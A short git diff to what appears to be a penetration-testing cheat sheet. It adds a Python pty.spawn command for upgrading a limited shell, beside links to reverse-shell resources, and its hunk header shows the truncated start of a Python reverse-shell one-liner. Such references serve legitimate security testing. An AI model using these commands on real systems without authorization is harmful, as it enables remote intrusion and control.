@@ -3929,6 +3929,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 - [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [Reverse Shell Generator](https://www.revshells.com/)
 - [Upgrade a Dumb Shell to a Fully Interactive Shell for More Flexibility](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
+  - `python -c 'import pty;pty.spawn("/bin/bash")'`
 
 #### <ins>Service Exploits</ins>
 
